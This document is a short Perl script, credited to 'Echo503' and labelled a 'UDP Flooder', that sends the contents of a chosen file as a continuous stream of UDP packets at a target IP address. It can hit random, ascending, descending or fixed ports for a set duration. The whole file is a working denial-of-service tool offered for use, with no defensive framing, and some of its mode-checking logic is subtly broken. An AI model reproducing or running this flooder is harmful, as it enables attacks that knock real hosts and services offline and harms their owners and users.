use Socket;
use strict;
use IO::Socket;

if ($#ARGV != 3) {
  print "\n
|~~~~~~~~~~~~~~~~~~~~~~~~~~~|
| (rand)        Random Port |
| (asc)     0 to 65535 ASC  |
| (dsc)     65535 to 0 DSC  |
|~~~~~~~~~~~~~~~~~~~~~~~~~~~|

UDP Flooder by Echo503
Use -> perl UDP.pl <IP> <PORT> <FILE> <TIME>

\n";
exit(1);
}
 my ($ip,$port,$file,$time) = @ARGV;

my ($iaddr,$endtime);

$iaddr = inet_aton("$ip") or die "Error\n"; $endtime = time() + ($time ?
$time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 17);

if($port == "rand"){
        for (;time() <= $endtime;) {
                open (FILE,$file) ; binmode(FILE) ;
                my $buffer ;
                while( sysread(FILE, $buffer , 1458) ) {
                        send("flood", $buffer, 0, pack_sockaddr_in(int(rand(65535)+1), $iaddr));
                }
        }
        exit;
}
elsif($port == "asc"){
        my $asc = 0;
        for (;time() <= $endtime;) {
                open (FILE,$file) ; binmode(FILE) ;
                my $buffer ;
                while( sysread(FILE, $buffer , 1458) ) {
                        if($asc == 65536){
                                $asc = 0;
                        }
                        else{
                                $asc++;
                        }
                        send("flood", $buffer, 0, pack_sockaddr_in($asc, $iaddr));
                }
        }
        exit;
}
elsif($port == "dsc"){
        my $dsc = 65535;
        for (;time() <= $endtime;) {
                open (FILE,$file) ; binmode(FILE) ;
                my $buffer ;
                while( sysread(FILE, $buffer , 1458) ) {
                        if($dsc == 0){
                                $dsc = 65535;
                        }
                        else{
                                $dsc--;
                        }
                        send("flood", $buffer, 0, pack_sockaddr_in($dsc, $iaddr));
                }
        }
        exit;
}
elsif($port <= 65535 and $port >= 0){
        for (;time() <= $endtime;) {
                open (FILE,$file) ; binmode(FILE) ;
                my $buffer ;
                while( sysread(FILE, $buffer , 1458) ) {
                        send("flood", $buffer, 0, pack_sockaddr_in($port, $iaddr));
                }
        }
        exit;
}